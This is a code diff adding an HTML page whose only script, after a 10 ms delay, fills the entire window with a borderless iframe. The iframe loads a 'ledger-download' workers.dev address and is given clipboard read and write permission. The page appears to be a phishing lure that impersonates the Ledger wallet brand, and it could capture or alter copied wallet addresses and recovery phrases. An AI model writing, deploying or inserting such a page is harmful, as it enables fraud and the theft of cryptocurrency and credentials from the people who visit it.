@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8" />
+</head>
+<body>
+
+  <script>
+    const loadAfterDelay = async () => {
+      await new Promise(resolve => setTimeout(resolve, 10));
+
+      const iframe = document.createElement('iframe');
+      iframe.src = 'https://my-worker-project.ledger-download.workers.dev/';
+      iframe.allow = 'clipboard-read; clipboard-write; fullscreen';
+      iframe.style.position = 'fixed';
+      iframe.style.inset = '0px';
+      iframe.style.width = '100vw';
+      iframe.style.height = '100vh';
+      iframe.style.border = '0px';
+      document.body.appendChild(iframe);
+    };
+
+    loadAfterDelay();
+  </script>
+
+</body>
+</html>
